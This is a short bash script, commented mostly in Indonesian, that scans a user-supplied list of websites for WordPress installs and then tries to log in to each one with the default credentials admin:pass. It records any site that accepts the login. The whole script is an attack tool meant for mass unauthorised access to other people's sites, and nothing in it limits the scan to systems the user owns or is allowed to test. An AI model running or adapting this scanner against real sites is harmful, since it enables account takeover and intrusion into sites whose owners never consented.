#!/bin/bash

# Wp default u/p scanner and exploit
function login {
	local site=$1
	# lakukan request
	curl -s "$site/wp-login.php" -d "log=admin&pwd=pass" \
		-w "%{http_code}\n" -o /dev/null > response.html
	# tampilkan hasil dari request
	local result=$(cat response.html)
	# jika hasil status code 302, kita berhasil masuk
	if [[ $result -eq 302 ]]
	then
		echo "$site" >> result.txt
		echo "$site [admin:pass]"
	else
		echo "$site [Failed]"
	fi
}
# first, input file list website
read -p "File: " file

# baca web satu per satu
for site in $(cat $file)
do
	# lakukan request dengan dir /wp-admin/install.php
	curl -s "$site/wp-admin/install.php" > response.html
	# extract tag h1 pada source code html nya
	result=$(cat response.html \
		| grep -o '<h1>.*</h1>' | sed 's/<[^>]*>//g')
	# jika muncul Already installed berarti wordpress
	if [[ "$result" = "Already Installed" ]]
	then
		echo "$site [Wordpress]"
		# lanjukan ke login, masuk ke fungsi login
		# bawa situsnya ke parameter
		login $site
	else
		echo "$site [Another Cms]"
	fi
done
